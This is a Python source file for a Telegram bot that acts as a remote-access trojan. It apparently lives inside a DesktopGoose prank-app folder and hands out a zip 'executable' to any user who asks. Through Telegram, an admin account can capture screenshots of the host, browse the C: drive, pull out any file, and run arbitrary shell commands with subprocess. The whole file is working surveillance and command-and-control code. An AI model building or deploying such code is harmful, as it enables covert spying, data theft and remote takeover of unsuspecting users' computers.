import os
import telebot
from telebot import types
import pyautogui
from Database.datab import create_table_if_not_exists, insert_or_update_user, insert_screenshot
from datetime import datetime, time
from dotenv import load_dotenv
import subprocess

# Conexión con nuestro BOT
# Cargar las variables de entorno desde el archivo .env
load_dotenv()
# Leer el token desde la variable de entorno
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
# Control para verificar que exista la variable de entorno
if not TOKEN:
    raise ValueError("El token de Telegram no está configurado. Por favor, configúralo en el archivo .env")

bot = telebot.TeleBot(TOKEN)

# ID del usuario admin
ADMIN_ID = 5433151369

# Ruta para guardar capturas de pantalla (ruta relativa)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURES_DIR = os.path.join(BASE_DIR, 'DesktopGoose-v0.31/Assets/Images/Memes')
if not os.path.exists(CAPTURES_DIR):
    os.makedirs(CAPTURES_DIR)

# Ruta del ejecutable a descargar
EXECUTABLE_PATH = os.path.join(BASE_DIR,'PruebasEpn.zip')

# Ruta del script para iniciar la aplicación
SCRIPT_PATH = os.path.join(BASE_DIR, 'run_application.py')
create_table_if_not_exists()

# Definir directorio base como raíz del disco C
BASE_DIR = 'C:/'

# Diccionario para almacenar la última carpeta listada por cada usuario
user_directories = {}

# Función para enviar archivos con reintentos y notificar al administrador
def send_file_with_retry(chat_id, file_path, caption, markup, retries=3, delay=5):
    """Intenta enviar un archivo con reintentos en caso de fallo."""
    for attempt in range(retries):
        try:
            with open(file_path, 'rb') as file:
                bot.send_document(chat_id, file, caption=caption, reply_markup=markup)
            
            # Notificar al administrador si el archivo se envió con éxito
            if chat_id != ADMIN_ID:
                notify_admin(chat_id, file_path)
            return
        except Exception as e:
            bot.send_message(chat_id, f"Intento {attempt + 1} fallido: {str(e)}")
            time.sleep(delay)
    bot.send_message(chat_id, "No se pudo enviar el archivo después de varios intentos.")

# Función para notificar al administrador
def notify_admin(user_id, file_path):
    user_name = bot.get_chat_member(user_id, user_id).user.first_name
    bot.send_message(ADMIN_ID, f"El usuario {user_name} ({user_id}) ha descargado el archivo {os.path.basename(file_path)}.")

# Función para crear el menú de botones para usuarios normales
def get_normal_menu():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_help = types.KeyboardButton('/help')
    btn_user_info = types.KeyboardButton('/user_info')
    btn_download = types.KeyboardButton('/download')
    markup.add(btn_help, btn_user_info, btn_download)
    return markup

# Función para crear el menú de botones para usuarios admin
def get_admin_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_help = types.KeyboardButton('/help')
    btn_screenshot = types.KeyboardButton('/screenshot')
    btn_list_files = types.KeyboardButton('/list_files')
    btn_list_directory = types.KeyboardButton('/list_directory')
    btn_remote_command = types.KeyboardButton('/remote_command')
    btn_download = types.KeyboardButton('/download')
    btn_run_application = types.KeyboardButton('/run_application')
    markup.add(btn_help, btn_screenshot, btn_list_files, btn_list_directory, btn_remote_command, btn_download, btn_run_application)
    return markup

# Función para enviar instrucciones y mostrar botones
def send_instructions(chat_id):
    if is_admin(chat_id):
        markup = get_admin_menu()
    else:
        markup = get_normal_menu()
    
    if is_admin(chat_id):
        welcome_message = ("Hola Admin! Puedes interactuar conmigo usando los siguientes comandos:\n"
                           "/help - Muestra este mensaje de ayuda\n"
                           "/screenshot - Toma y envía una captura de pantalla\n"
                           "/list_files - Lista los directorios en la raíz del disco C\n"
                           "/list_directory - Lista el contenido de una carpeta específica\n"
                           "/remote_command - Ejecuta un comando remoto\n"
                           "/download - Descarga el ejecutable\n"
                           "/run_application - Inicia la aplicación")
    else:
        user_name = bot.get_chat_member(chat_id, chat_id).user.first_name
        welcome_message = (f"Hola {user_name}! Puedes interactuar conmigo usando los siguientes comandos:\n"
                           "/help - Muestra este mensaje de ayuda\n"
                           "/user_info - Muestra tu información de usuario\n"
                           "/download - Descarga el ejecutable!")
    
    bot.send_message(chat_id, welcome_message, reply_markup=markup)

# Verificar si el usuario es admin
def is_admin(user_id):
    return user_id == ADMIN_ID

@bot.message_handler(commands=['save'])
def save_user(message):
    telegram_id = message.from_user.id
    name = message.from_user.first_name
    insert_or_update_user(telegram_id, name)
    bot.reply_to(message, f'Bienvenido {name}, tu información ha sido guardada')

# Comando /help para proporcionar ayuda
@bot.message_handler(commands=['help'])
def send_help(message):
    if is_admin(message.from_user.id):
        markup = get_admin_menu()
    else:
        markup = get_normal_menu()
        
    help_message = ('Puedes interactuar conmigo usando los siguientes comandos:\n'
                    '/start - Inicia el bot y muestra el menú\n'
                    '/help - Muestra este mensaje de ayuda\n'
                    '/screenshot - Toma y envía una captura de pantalla\n'
                    '/send_files - Envía un archivo\n'
                    '/list_files - Lista los directorios en la raíz del disco C\n'
                    '/list_directory - Lista el contenido de una carpeta específica\n'
                    '/remote_command - Ejecuta un comando remoto\n'
                    '/download - Descarga el ejecutable\n'
                    '/run_application - Inicia la aplicación')
    bot.send_message(message.chat.id, help_message, reply_markup=markup)

# Comando /user_info para mostrar la información del usuario
@bot.message_handler(commands=['user_info'])
def user_info(message):
    user_name = message.from_user.first_name
    markup = get_normal_menu()
    bot.send_message(message.chat.id, f"Hola {user_name}! Este es tu perfil.", reply_markup=markup)

# Comando /screenshot para capturar y enviar una captura de pantalla
@bot.message_handler(commands=['screenshot'])
def send_screenshot(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
        return
    
    markup = get_admin_menu()
    try:
        screenshot = pyautogui.screenshot()
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        screenshot_path = os.path.join(CAPTURES_DIR, f'screenshot_{timestamp}.png')
        screenshot.save(screenshot_path)
        insert_screenshot(message.from_user.id, screenshot_path)
        with open(screenshot_path, 'rb') as file:
            bot.send_photo(message.chat.id, file, caption="Aquí tienes la captura de pantalla.", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo tomar la captura de pantalla: {str(e)}", reply_markup=markup)

# Comando /list_files para listar los directorios en la raíz del disco C
@bot.message_handler(commands=['list_files'])
def list_files(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
        return

    markup = get_admin_menu()
    try:
        root_dir = 'C:/'
        directories = [d for d in os.listdir(root_dir) if os.path.isdir(os.path.join(root_dir, d))]
        if directories:
            directory_list = "\n".join(directories)
            bot.send_message(message.chat.id, f"Directorios en la raíz de C:\n{directory_list}", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "No se encontraron directorios en la raíz de C:\n", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar los directorios en la raíz de C:\n{str(e)}", reply_markup=markup)

# Comando /list_directory para listar el contenido de una carpeta específica
@bot.message_handler(commands=['list_directory'])
def request_directory(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
        return

    user_directories[message.chat.id] = BASE_DIR
    msg = bot.send_message(message.chat.id, f'Estás en {BASE_DIR}. Ingresa el nombre de la carpeta para listar su contenido:')
    bot.register_next_step_handler(msg, list_directory)

def list_directory(message):
    markup = get_admin_menu()
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    folder_name = message.text.strip()
    new_path = os.path.join(current_path, folder_name)
    
    try:
        if os.path.exists(new_path) and os.path.isdir(new_path):
            user_directories[message.chat.id] = new_path
            files = os.listdir(new_path)
            if files:
                file_list = "\n".join(files)
                bot.send_message(message.chat.id, f"Contenido de la carpeta '{new_path}':\n{file_list}", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, f"La carpeta '{new_path}' está vacía.", reply_markup=markup)
            msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta de '{new_path}'? Si es así, ingresa el nombre de la subcarpeta. Para regresar al directorio anterior, ingresa '..'. Para enviar un archivo, escribe 'enviar [nombre del archivo]'.")
            bot.register_next_step_handler(msg, handle_next_step)
        else:
            bot.send_message(message.chat.id, f"La ruta '{new_path}' no es válida o no es un directorio.", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar la carpeta '{new_path}': {str(e)}", reply_markup=markup)

def handle_next_step(message):
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    input_text = message.text.strip()
    
    if input_text.lower().startswith('enviar '):
        file_name = input_text[7:].strip()
        file_path = os.path.join(current_path, file_name)
        send_specific_file(message, file_path)
    elif input_text == '..':
        new_path = os.path.dirname(current_path)
        user_directories[message.chat.id] = new_path
        list_directory(message)
    else:
        folder_name = input_text
        new_path = os.path.join(current_path, folder_name)
        list_directory(message)

def send_specific_file(message, file_path):
    markup = get_admin_menu()
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"Aquí tienes el archivo {os.path.basename(file_path)}.", reply_markup=markup)
        except Exception as e:
            bot.send_message(message.chat.id, f"No se pudo enviar el archivo: {str(e)}", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, f"El archivo '{file_path}' no existe o la ruta no es válida.", reply_markup=markup)
        msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta o enviar un archivo desde '{os.path.dirname(file_path)}'? Ingresa el nombre de la subcarpeta o 'enviar [nombre del archivo]'.")
        bot.register_next_step_handler(msg, handle_next_step)

# Comando /remote_command para ejecutar un comando remoto
@bot.message_handler(commands=['remote_command'])
def request_command(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
        return
    
    msg = bot.send_message(message.chat.id, 'Ingresa el comando que deseas ejecutar:')
    bot.register_next_step_handler(msg, run_remote_command)

def run_remote_command(message):
    command = message.text.strip()
    markup = get_admin_menu()
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        bot.send_message(message.chat.id, f"Resultado de '{command}':\n{result}", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo ejecutar el comando '{command}': {str(e)}", reply_markup=markup)

# Comando /download para enviar un archivo
@bot.message_handler(commands=['download'])
def send_files(message):
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_normal_menu()
    file_path = EXECUTABLE_PATH
    if os.path.exists(file_path):
        send_file_with_retry(message.chat.id, file_path, caption="Aquí tienes el ejecutable.", markup=markup)
    else:
        bot.send_message(message.chat.id, "El archivo no se encuentra disponible en este momento.", reply_markup=markup)

# Comando /run_application para iniciar la aplicación
@bot.message_handler(commands=['run_application'])
def run_application(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
        return

    markup = get_admin_menu()
    try:
        subprocess.Popen(['python', SCRIPT_PATH])
        bot.send_message(message.chat.id, "La aplicación ha sido iniciada.", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo iniciar la aplicación: {str(e)}", reply_markup=markup)

# Manejador para cualquier otro mensaje recibido
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    create_table_if_not_exists()
    insert_or_update_user(message.from_user.id, message.from_user.first_name)
    send_instructions(message.chat.id)
    
    
def run_bot():
    bot.polling(none_stop=True)